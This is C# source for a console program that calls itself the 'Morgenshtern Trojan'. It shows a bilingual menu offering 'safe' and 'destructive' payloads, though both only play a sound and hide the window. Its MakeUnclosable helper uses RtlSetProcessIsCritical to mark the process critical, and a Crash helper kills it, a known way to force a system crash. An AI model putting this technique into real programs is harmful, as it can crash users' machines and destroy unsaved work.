using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Uranus;

namespace Morgenshtern
{
    public class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern void RtlSetProcessIsCritical(int v1, int v2, int v3);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static bool isRussian = false;

        public static string GetStr(int i) => isRussian ? Localization.russian[i] : Localization.english[i];

        public static async Task Main(string[] args)
        {
            SetProcessDPIAware();

            Console.Title = "Morgenshtern Trojan";
            await CoolConsole.WriteLine("=================================");
            await CoolConsole.WriteLine("Morgenshtern Trojan - TheAirBlow");
            await CoolConsole.WriteLine(GetStr(0));
            await CoolConsole.WriteLine("=================================");
            Console.ForegroundColor = ConsoleColor.Yellow;
            await CoolConsole.WriteLine("Напиши '1'  - Русский язык");
            await CoolConsole.WriteLine("Press Enter - English language");
            await CoolConsole.WriteLine("Note: Internet required");
            await CoolConsole.WriteLine("Заметка: Нужен Интернет");
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option1 = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            Console.CursorTop -= 5;
            await CoolConsole.ClearLines(6);
            if (option1 == '1') isRussian = true;

            await CoolConsole.Loading(5);
            Console.Clear();

            await CoolConsole.WriteLine("=================================");
            await CoolConsole.WriteLine("Morgenshtern Trojan - TheAirBlow");
            await CoolConsole.WriteLine(GetStr(0));
            await CoolConsole.WriteLine("=================================");
            Console.ForegroundColor = ConsoleColor.Yellow;
            await CoolConsole.WriteLine(GetStr(1));
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            Console.CursorTop -= 4;
            await CoolConsole.ClearLines(6);
            if (option != '1')
            {
                await CoolConsole.WriteLine(GetStr(2));
                await CoolConsole.WriteLine("=================================");
                await Task.Delay(1000);
                return;
            }
            await Menu();
        }

        public static async Task Menu()
        {
            Console.CursorTop = 4;
            await CoolConsole.ClearLines(10);
            Console.ForegroundColor = ConsoleColor.Cyan;
            await CoolConsole.WriteLine(GetStr(3));
            Console.ForegroundColor = ConsoleColor.Gray;
            await CoolConsole.WriteLine("=================================");
            char option = Console.ReadKey().KeyChar;
            Console.CursorLeft = 0;
            switch (option)
            {
                case '#':
                    Console.CursorTop = 4;
                    await CoolConsole.ClearLines(6);
                    await CoolConsole.WriteLine(GetStr(2));
                    await CoolConsole.WriteLine("=================================");
                    await Task.Delay(1000);
                    return;
                case '1':
                    Console.CursorTop = 4;
                    await CoolConsole.ClearLines(6);
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    await CoolConsole.WriteLine(GetStr(6));
                    Console.ForegroundColor = ConsoleColor.Gray;
                    await CoolConsole.WriteLine("=================================");
                    char option1 = Console.ReadKey().KeyChar;
                    Console.CursorLeft = 0;
                    Console.CursorTop -= 5;
                    await CoolConsole.ClearLines(6);
                    if (option1.ToString().ToLower() == "s")
                    {
                        // Safe payload
                        SystemSounds.Asterisk.Play();
                        ShowWindow(GetConsoleWindow(), 0);
                    }
                    await Menu();
                    return;
                case '2':
                    Console.CursorTop = 4;
                    await CoolConsole.ClearLines(6);
                    Console.ForegroundColor = ConsoleColor.Red;
                    await CoolConsole.WriteLine(GetStr(7));
                    Console.ForegroundColor = ConsoleColor.Gray;
                    await CoolConsole.WriteLine("=================================");
                    char option2 = Console.ReadKey().KeyChar;
                    Console.CursorLeft = 0;
                    Console.CursorTop -= 5;
                    await CoolConsole.ClearLines(6);
                    if (option2.ToString().ToLower() == "d")
                    {
                        // Destructive payload
                        SystemSounds.Asterisk.Play();
                        ShowWindow(GetConsoleWindow(), 0);
                    }
                    await Menu();
                    return;
                default:
                    Console.CursorTop = 4;
                    await CoolConsole.ClearLines(5);
                    Console.ForegroundColor = ConsoleColor.Red;
                    await CoolConsole.WriteLine(GetStr(4));
                    Console.ForegroundColor = ConsoleColor.Gray;
                    await CoolConsole.WriteLine("=================================");
                    await Task.Delay(1000);
                    await Menu();
                    return;
            }
        }

        internal static void MakeUnclosable()
        {
            // Make itself a critical process
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        internal static void Crash()
        {
            // Kill itself
            Process.GetCurrentProcess().Kill();
        }
    }
}
